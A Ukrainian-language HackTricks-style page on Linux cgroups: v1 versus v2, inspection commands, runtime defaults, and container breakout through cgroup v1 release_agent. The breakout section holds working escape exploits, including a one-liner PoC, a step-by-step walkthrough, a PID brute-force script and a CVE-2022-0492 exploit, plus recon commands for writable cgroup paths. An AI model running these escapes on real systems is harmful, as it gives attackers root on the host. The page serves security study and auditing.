# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

**Control groups** Linux — це механізм ядра, який використовується для об'єднання процесів з метою обліку, обмеження, визначення пріоритетів і застосування політик. Якщо namespaces переважно ізолюють представлення ресурсів, то cgroups переважно керують **тим, скільки** цих ресурсів може споживати певний набір процесів і, у деяких випадках, **з якими класами ресурсів** вони взагалі можуть взаємодіяти. Контейнери постійно покладаються на cgroups, навіть якщо користувач ніколи не переглядає їх безпосередньо, оскільки майже кожному сучасному runtime потрібен спосіб повідомити ядру: «ці процеси належать до цього workload, і до них застосовуються такі правила використання ресурсів».

Саме тому container engines розміщують новий контейнер у власному дереві cgroup. Коли дерево процесів уже розміщене там, runtime може обмежити пам'ять, встановити ліміт кількості PID, визначити вагу використання CPU, регулювати I/O і обмежити доступ до пристроїв. У production environment це важливо як для безпеки multi-tenant середовища, так і для простої операційної стабільності. Контейнер без належних обмежень ресурсів може вичерпати пам'ять, створити надмірну кількість процесів або монополізувати CPU та I/O, через що host або сусідні workloads стануть нестабільними.

З погляду security cgroups важливі з двох окремих причин. По-перше, неналежні або відсутні обмеження ресурсів уможливлюють прості атаки типу denial-of-service. По-друге, деякі функції cgroups, особливо у старих конфігураціях **cgroup v1**, історично створювали потужні примітиви для breakout, коли з контейнера до них можна було отримати доступ на запис.

## v1 Vs v2

У реальних системах існують дві основні моделі cgroups. **cgroup v1** надає кілька ієрархій контролерів, а старі exploit writeups часто стосуються незвичних і часом надмірно потужних семантик, доступних там. **cgroup v2** запроваджує більш уніфіковану ієрархію та загалом чистішу поведінку. Сучасні distributions дедалі частіше надають перевагу cgroup v2, але змішані або legacy environments усе ще існують, а це означає, що під час аналізу реальних систем актуальними залишаються обидві моделі.

Ця відмінність важлива, оскільки деякі найвідоміші історії про container breakout, наприклад зловживання **`release_agent`** у cgroup v1, дуже конкретно пов'язані зі старою поведінкою cgroup. Читач, який побачить cgroup exploit у блозі, а потім бездумно застосує його до сучасної системи, що працює лише з cgroup v2, найімовірніше, неправильно зрозуміє, що насправді можливо на target.

## Inspection

Найшвидший спосіб побачити, де розташована ваша поточна shell, — це:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Файл `/proc/self/cgroup` показує шляхи cgroup, пов'язані з поточним процесом. На сучасному хості з cgroup v2 ви часто бачитимете уніфікований запис. На старіших або гібридних хостах може відображатися кілька шляхів контролерів v1. Визначивши шлях, можна перевірити відповідні файли в `/sys/fs/cgroup`, щоб переглянути ліміти та поточне використання.

На хості з cgroup v2 корисними є такі команди:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Ці файли показують, які контролери існують і які з них делеговані дочірнім cgroup. Ця модель делегування важлива в rootless- і systemd-managed середовищах, де runtime може мати змогу керувати лише тією частиною функціональності cgroup, яку фактично делегує батьківська ієрархія.

## Лабораторна робота

Один зі способів побачити cgroup на практиці — запустити контейнер із обмеженням пам’яті:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Ви також можете спробувати контейнер з обмеженням PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Ці приклади корисні, оскільки допомагають пов’язати runtime-флаг із файловим інтерфейсом kernel. Runtime не застосовує правило магічним чином: він записує відповідні налаштування cgroup, після чого kernel застосовує їх до дерева процесів.

## Використання runtime

Docker, Podman, containerd і CRI-O покладаються на cgroups у межах штатної роботи. Відмінності зазвичай полягають не в тому, чи використовують вони cgroups, а в тому, **які значення за замовчуванням вони обирають**, **як взаємодіють із systemd**, **як працює rootless delegation** і **яка частина конфігурації контролюється на рівні engine, а яка — на рівні orchestration**.

У Kubernetes resource requests і limits зрештою перетворюються на конфігурацію cgroup на node. Шлях від Pod YAML до застосування обмежень kernel проходить через kubelet, CRI runtime і OCI runtime, але cgroups усе одно залишаються kernel-механізмом, який зрештою застосовує правило. У середовищах Incus/LXC cgroups також активно використовуються, особливо тому, що system containers часто надають багатше дерево процесів і більш схожі на VM операційні очікування.

## Неправильні конфігурації та breakouts

Класична історія безпеки cgroup пов’язана з доступним для запису механізмом **cgroup v1 `release_agent`**. У цій моделі, якщо attacker міг записувати у відповідні файли cgroup, увімкнути `notify_on_release` і контролювати шлях, збережений у `release_agent`, kernel міг зрештою виконати обраний attacker-ом шлях в initial namespaces на host, коли cgroup ставала порожньою. Саме тому старі writeup приділяють так багато уваги доступності для запису cgroup controllers, mount options і умовам namespace/capability.

Навіть коли `release_agent` недоступний, помилки в cgroup усе одно мають значення. Надто широкий доступ до devices може зробити host devices доступними з container. Відсутність обмежень memory і PID може перетворити просте code execution на host DoS. Слабка cgroup delegation у rootless-сценаріях також може ввести defenders в оману, змусивши їх вважати, що обмеження існує, хоча runtime насправді ніколи не міг його застосувати.

### Передумови `release_agent`

Техніка `release_agent` застосовується лише до **cgroup v1**. Основна ідея полягає в тому, що коли останній процес у cgroup завершується, а `notify_on_release=1` встановлено, kernel виконує програму, шлях до якої збережено в `release_agent`. Це виконання відбувається в **initial namespaces на host**, саме тому доступний для запису `release_agent` перетворюється на примітив escape з container.

Щоб техніка спрацювала, attacker зазвичай потрібні:

- доступна для запису ієрархія **cgroup v1**
- можливість створити або використати child cgroup
- можливість встановити `notify_on_release`
- можливість записати шлях у `release_agent`
- шлях, який з точки зору host вказує на executable

### Класичний PoC

Історичний однорядковий PoC має такий вигляд:<sup>[[1]](#references)</sup>
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Цей PoC записує шлях до payload у `release_agent`, запускає вивільнення cgroup, а потім зчитує вихідний файл, створений на host.

### Покроковий опис

Цю саму ідею легше зрозуміти, якщо розбити її на кроки.<sup>[[1]](#references)</sup>

1. Створіть і підготуйте доступний для запису cgroup:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Визначте шлях на хості, який відповідає файловій системі контейнера:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Розмістіть payload, який буде видимим зі шляху хоста:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Ініціюйте виконання, зробивши cgroup порожньою:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Результатом є виконання payload на стороні host із привілеями root host. У реальному exploit payload зазвичай записує proof-файл, запускає reverse shell або змінює стан host.

### Варіант із відносним шляхом через `/proc/<pid>/root`

У деяких середовищах шлях host до файлової системи контейнера неочевидний або прихований storage driver. У такому разі шлях до payload можна вказати через `/proc/<pid>/root/...`, де `<pid>` — це PID host, що належить процесу в поточному контейнері. На цьому ґрунтується варіант brute-force із відносним шляхом:<sup>[[2]](#references)</sup>
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Відповідний trick тут полягає не в самому brute force, а у формі path: `/proc/<pid>/root/...` дає kernel змогу визначити файл усередині файлової системи container з host namespace, навіть коли прямий host storage path заздалегідь невідомий.

### Варіант CVE-2022-0492

У 2022 році CVE-2022-0492 продемонструвала, що запис до `release_agent` у cgroup v1 не перевіряв належним чином наявність `CAP_SYS_ADMIN` у **initial** user namespace. Це зробило техніку значно доступнішою на вразливих kernels, оскільки container process, який міг змонтувати cgroup hierarchy, міг записувати в `release_agent`, не маючи заздалегідь привілеїв у host user namespace.<sup>[[3]](#references)</sup>

Мінімальний exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
У вразливому ядрі host виконує `/proc/self/exe` із привілеями root на host.

Для практичного зловживання спочатку перевірте, чи середовище досі надає доступ до шляхів cgroup-v1 із правом запису або небезпечний доступ до пристроїв:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Якщо `release_agent` присутній і доступний для запису, ви вже маєте справу з legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Якщо сам шлях cgroup не дає змоги виконати escape, наступним практичним застосуванням часто стають denial of service або reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Ці команди швидко покажуть, чи має workload достатньо ресурсів для запуску fork-bomb, агресивного споживання пам’яті або зловживання доступним для запису legacy-інтерфейсом cgroup.

## Перевірки

Під час перевірки цілі мета перевірок cgroup полягає в тому, щоб з’ясувати, яку модель cgroup використано, чи бачить контейнер доступні для запису шляхи контролерів і чи взагалі актуальні старі примітиви breakout, такі як `release_agent`.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Що тут становить інтерес:

- Якщо `mount | grep cgroup` показує **cgroup v1**, старіші описи breakout стають більш актуальними.
- Якщо `release_agent` існує та доступний, це одразу варто дослідити глибше.
- Якщо видима ієрархія cgroup доступна для запису, а контейнер також має потужні capabilities, це середовище заслуговує на значно ретельніший огляд.

Якщо ви виявили **cgroup v1**, доступні для запису монтування контролерів і контейнер, який також має потужні capabilities або слабкий захист seccomp/AppArmor, ця комбінація заслуговує на особливу увагу. cgroups часто розглядають як нудну тему керування ресурсами, але історично вони були частиною одних із найповчальніших ланцюжків container escape саме тому, що межа між «контролем ресурсів» і «впливом на host» не завжди була такою чіткою, як вважалося.

## Типові налаштування runtime

| Runtime / платформа | Типовий стан | Типова поведінка | Поширене ручне послаблення |
| --- | --- | --- | --- |
| Docker Engine | Увімкнено за замовчуванням | Контейнери автоматично розміщуються в cgroups; обмеження ресурсів є необов’язковими, якщо їх не вказано через flags | пропуск `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Увімкнено за замовчуванням | `--cgroups=enabled` використовується за замовчуванням; значення за замовчуванням для cgroup namespace залежать від версії cgroup (`private` у cgroup v2, `host` у деяких конфігураціях cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, послаблений доступ до пристроїв, `--privileged` |
| Kubernetes | Увімкнено через runtime за замовчуванням | Pods і контейнери розміщуються в cgroups runtime вузла; точне керування ресурсами залежить від `resources.requests` / `resources.limits` | пропуск запитів/лімітів ресурсів, privileged-доступ до пристроїв, неправильна конфігурація runtime на рівні host |
| containerd / CRI-O | Увімкнено за замовчуванням | cgroups є частиною звичайного керування життєвим циклом | прямі конфігурації runtime, які послаблюють контроль пристроїв або відкривають застарілі інтерфейси cgroup v1, доступні для запису |

Важлива відмінність полягає в тому, що **наявність cgroup** зазвичай є типовою, тоді як **корисні обмеження ресурсів** часто є необов’язковими, якщо їх явно не налаштовано.

## Посилання

- [1] [Розуміння container escape у Docker](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [2] [Privileged Container Escape - Control Groups release_agent](http://blog.ajxchapman.com/containers/2020/11/19/privileged-container-escape.html)
- [3] [Нова вразливість Linux CVE-2022-0492, що впливає на Cgroups: чи можуть контейнери виконати escape?](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)

{{#include ../../../../banners/hacktricks-training.md}}
